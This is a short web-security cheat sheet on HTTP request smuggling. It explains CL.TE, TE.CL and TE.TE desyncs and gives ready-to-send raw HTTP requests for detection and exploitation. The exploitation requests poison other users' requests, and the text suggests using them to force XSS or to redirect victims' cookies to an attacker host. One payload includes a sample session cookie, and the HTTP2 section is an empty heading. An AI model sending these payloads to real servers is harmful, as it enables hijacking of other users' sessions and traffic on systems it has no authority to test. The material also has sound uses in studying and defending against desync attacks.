---
title: Request Smuggling
description: HTTP Request Smuggling atttacks
---


## Notation

- **CL.TE**: front-end server uses the `Content-Length` header and the back-end server server uses the `Transfer-Encoding` header.
- **TE.CL**: front-end server uses the `Transfer-Encoding` header and the back-end server server uses the `Content-Length` header.
- **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.


## Detection

Please **FIRST** try detecting **CL.TE** as if it is vulnerable to it, the **TE.CL** detection payload wil poison the socket and cause a lot of harm

### **CL.TE** detection

Send the following request:

```http
POST /about HTTP/1.1
Host: {{ target-domain vulerable.net }}
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

There is 4 possible outcomes:
 - CL.CL: backend response
 - TE.TE: frontend response
 - TE.CL: frontend response
 - **CL.TE: timeout** (_vulnerable_)

Only after confirming no **CL.TE** desync attacks can be performed you can check the next variant:


### **TE.CL** detection

Send the following request:

```http
POST /about HTTP/1.1
Host: {{ target-domain vulerable.net }}
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

There is 4 possible outcomes:
 - CL.CL: backend response
 - TE.TE: backend response
 - **TE.CL: timeout** (_vulnerable_)
 - _CL.TE: socket poison_ 💀




## Exploitation


### CL.TE

You can just _poison_ legitimate requests. For example the following request would result on the next user doing a `SMUGGLEDPOST` request:

```http
POST / HTTP/1.1
Host: {{ target-domain vulerable.net }}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

You can Actually change other users requests, so you can force them  to execute a XSS for example. It is also common for web proxies to hapily redirect users based on the host header so you could redirect people to your collaborator with their cookies by just specifiying a host header for the users.



### TE.CL


```http
POST / HTTP/1.1
Host: {{ target-domain vulerable.net }}
Cookie: session=fnJJc90vRfPmIYHB3xmzTYJyhLx5JhGO
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

9d
GPOST / HTTP/1.1
Host: {{ target-domain vulerable.net }}
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

a=
0


```



## TE.TE into CL.TE


```http
POST / HTTP/1.1
Host: {{ target-domain vulerable.net }}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: cow
Transfer-Encoding: chunked

0

G
```

## HTTP2


